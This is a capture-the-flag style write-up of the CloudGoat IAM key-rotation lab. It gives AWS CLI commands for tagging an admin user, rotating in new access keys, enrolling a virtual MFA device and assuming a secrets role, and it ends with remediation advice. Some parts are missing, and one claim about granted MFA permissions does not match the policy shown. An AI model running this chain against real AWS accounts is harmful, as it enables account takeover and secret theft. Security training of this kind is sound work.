# 🥷 CloudGoat: IAM Privesc by Key Rotation

_Write-up: Escalating from a manager account to secrets access by weaponizing self-service key management_

## 🧭 Overview

**Scenario:** `iam_privesc_by_key_rotation` \
**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
**Tools:** AWS CLI + a TOTP authenticator app \
**Objective:** Starting as a low-privileged `manager` user, escalate to read the secret stored in AWS Secrets Manager that only an assumable role is allowed to view.

## ⚔️ Attack Path Summary

Manager (self-manage + tag) → Tag `admin` as `developer=true` → Rotate `admin` access keys → Log in as `admin` → Enroll a virtual MFA device → Assume the secrets role with MFA → Read the secret

The role's attached policy confirms what it unlocks:

## 🧩 Phase 3: Map Each User's Permissions

Now we walk every user's inline and attached policies to find a path to that role.

#### Manager (us)

```bash
aws iam list-attached-user-policies --user-name manager_cgid59sh0puk7n --profile cloudgoat
# → IAMReadOnlyAccess
aws iam list-user-policies --user-name manager_cgid59sh0puk7n --profile cloudgoat
# → SelfManageAccess, TagResources
```

**`SelfManageAccess`** is the crown jewel — but read the condition carefully:

```json
{
  "Action": [
    "iam:DeactivateMFADevice", "iam:GetMFADevice", "iam:EnableMFADevice",
    "iam:ResyncMFADevice", "iam:DeleteAccessKey", "iam:UpdateAccessKey",
    "iam:CreateAccessKey"
  ],
  "Condition": { "StringEquals": { "aws:ResourceTag/developer": "true" } },
  "Effect": "Allow",
  "Resource": [
    "arn:aws:iam::7912********:user/*",
    "arn:aws:iam::7912********:mfa/*"
  ],
  "Sid": "SelfManageAccess"
}
```

We can manage access keys **and MFA devices** for *any user* — provided that user carries the tag `developer=true`.

**`TagResources`** hands us exactly the missing ingredient:

```json
{
  "Action": [
    "iam:TagUser", "iam:UntagUser", "iam:TagRole", "iam:UntagRole",
    "iam:TagPolicy", "iam:UntagPolicy", "iam:TagMFADevice", "iam:UntagMFADevice"
  ],
  "Effect": "Allow",
  "Resource": "*",
  "Sid": "TagResources"
}
```

We can apply the `developer=true` tag to whomever we like. The condition on `SelfManageAccess` is one we control.

#### Developer

```bash
aws iam list-user-policies --user-name developer_cgid59sh0puk7n --profile cloudgoat
# → DeveloperViewSecrets  (secretsmanager:ListSecrets only — a dead end for GetSecretValue)
```

#### Admin

```bash
aws iam list-user-policies --user-name admin_cgid59sh0puk7n --profile cloudgoat
# → AssumeRoles
aws iam get-user-policy --user-name admin_cgid59sh0puk7n --policy-name AssumeRoles --profile cloudgoat
```

```json
{
  "PolicyDocument": {
    "Statement": [
      {
        "Action": "sts:AssumeRole",
        "Effect": "Allow",
        "Resource": "arn:aws:iam::7912********:role/cg_secretsmanager_cgid59sh0puk7n",
        "Sid": "AssumeRole"
      }
    ]
  }
}
```

**There it is.** The `admin` user is the only identity permitted to assume the secrets role. We can't assume it ourselves — but we *can* manipulate `admin`'s credentials, because `SelfManageAccess` works on any user we tag.

## 🧨 Phase 4: The Privesc Chain

The plan:

1. Tag `admin` with `developer=true` so `SelfManageAccess` applies to it.
2. Delete `admin`'s existing (inactive) access keys to free a slot.
3. Mint a fresh access key for `admin` — credentials we now control.
4. Log in as `admin`, enroll our own virtual MFA device.
5. Assume the secrets role with that MFA and read the flag.

#### Step 1 — Tag the admin as a developer

```bash
aws iam tag-user --user-name admin_cgid59sh0puk7n \
  --tags '[{"Key":"developer","Value":"true"}]' --profile cloudgoat
```

#### Step 2 — Clear the access-key slots

IAM caps a user at two access keys, and `admin` already has two (both `Inactive`). Delete them to make room.

```bash
aws iam list-access-keys --user-name admin_cgid59sh0puk7n --profile cloudgoat
```

```json
{
  "AccessKeyMetadata": [
    { "AccessKeyId": "AKIA************5IQWUKMF", "Status": "Inactive" },
    { "AccessKeyId": "AKIA************WBGMBR7E", "Status": "Inactive" }
  ]
}
```

```bash
aws iam delete-access-key --user-name admin_cgid59sh0puk7n \
  --access-key-id AKIA************5IQWUKMF --profile cloudgoat
aws iam delete-access-key --user-name admin_cgid59sh0puk7n \
  --access-key-id AKIA************WBGMBR7E --profile cloudgoat
```

#### Step 3 — Rotate in a key we own

```bash
aws iam create-access-key --user-name admin_cgid59sh0puk7n --profile cloudgoat
```

```json
{
  "AccessKey": {
    "UserName": "admin_cgid59sh0puk7n",
    "AccessKeyId": "AKIA****************",
    "SecretAccessKey": "26rsIBhLWEJrxKBQJTwOK5QgaBThD6R********",
    "Status": "Active"
  }
}
```

This is the "key rotation" the scenario is named for — we didn't guess `admin`'s password or find a leaked key. We *issued ourselves* a valid one.

```bash
aws configure --profile cg-admin   # paste the new key pair
aws sts get-caller-identity --profile cg-admin
```

```json
{
  "UserId": "AIDA****************",
  "Account": "7912********",
  "Arn": "arn:aws:iam::7912********:user/admin_cgid59sh0puk7n"
}
```

We are now `admin`.

## 🔐 Phase 5: Satisfy the MFA Gate

The role's trust policy demands `aws:MultiFactorAuthPresent: true`. `admin` has no MFA device — so we enroll one. `SelfManageAccess` already granted us `iam:CreateVirtualMFADevice` and `iam:EnableMFADevice`.

#### Create a Virtual MFA Device

```bash
aws iam create-virtual-mfa-device \
  --virtual-mfa-device-name cloudgoat-mfa \
  --bootstrap-method QRCodePNG \
  --outfile ~/cloudgoat-mfa.png \
  --profile cg-admin
```

```json
{
  "VirtualMFADevice": {
    "SerialNumber": "arn:aws:iam::7912********:mfa/cloudgoat-mfa"
  }
}
```

Scan `cloudgoat-mfa.png` with any TOTP authenticator (Authy, Google Authenticator, 1Password). Enrolling requires two *consecutive* codes to prove the seed synced:

```bash
aws iam enable-mfa-device \
  --user-name admin_cgid59sh0puk7n \
  --serial-number arn:aws:iam::7912********:mfa/cloudgoat-mfa \
  --authentication-code1 730646 \
  --authentication-code2 343671 \
  --profile cg-admin
```

## 🎭 Phase 6: Assume the Role with MFA → Flag

With MFA enrolled, feed a fresh TOTP code into `sts assume-role`:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::7912********:role/cg_secretsmanager_cgid59sh0puk7n \
  --role-session-name admin-session \
  --serial-number arn:aws:iam::7912********:mfa/cloudgoat-mfa \
  --token-code 280134 \
  --profile cg-admin
```

## 🚨 Weaknesses Demonstrated

| # | Weakness | CWE |
|---|----------|-----|
| 1 | Permission condition keyed on a tag the same principal can set (`iam:TagUser` + `aws:ResourceTag/developer`) | CWE-269 |
| 2 | Self-service access-key management (`iam:CreateAccessKey`/`DeleteAccessKey`) over `user/*` | CWE-732 |
| 3 | Self-service MFA enrollment lets an attacker satisfy the MFA gate they were meant to be blocked by | CWE-284 |
| 4 | Role trust policy trusts the whole account root, gated only by "any MFA present" | CWE-269 |

## 💡 Remediation

1. **Never gate a permission on a tag the grantee can write.** If `iam:TagUser` and a `aws:ResourceTag/*` condition live on the same principal, the condition is self-serviceable. Split tagging duties from key/MFA management, or scope tagging to a fixed resource set.
2. **Scope self-management to `self`.** Access-key and MFA actions should target `arn:aws:iam::<acct>:user/${aws:username}`, not `user/*`. A manager should never be able to rotate another user's keys.
3. **Don't let users enroll their own first MFA unsupervised** where MFA is the sole control protecting privileged role assumption. Bootstrap MFA out-of-band, or require an existing MFA to register a new one.
4. **Tighten role trust.** Trust specific principals, not `:root`, and add conditions beyond `MultiFactorAuthPresent` (e.g. `aws:PrincipalTag`, source identity, external ID).
5. **Alert on key rotation and MFA changes.** `DeleteAccessKey` + `CreateAccessKey` on another user, or a new `EnableMFADevice`, are high-signal CloudTrail events worth paging on.

## 🎓 Key Takeaways

1. **A condition is only as strong as who can satisfy it.** Gating a permission on `developer=true` is meaningless when the same principal holds `iam:TagUser`. Attacker-controllable conditions are no condition at all.
2. **Key rotation is a privesc primitive.** The right to create and delete another user's access keys is functionally the right to *become* that user — no password, no leaked secret required.
3. **MFA isn't a control if the target enrolls it.** Self-service MFA registration lets an attacker check the `MultiFactorAuthPresent` box themselves, turning the gate into a formality.
4. **Chain the small grants.** Tagging, key management, and MFA enrollment are each unremarkable alone — combined, they walk a low-priv manager straight into the secrets vault.
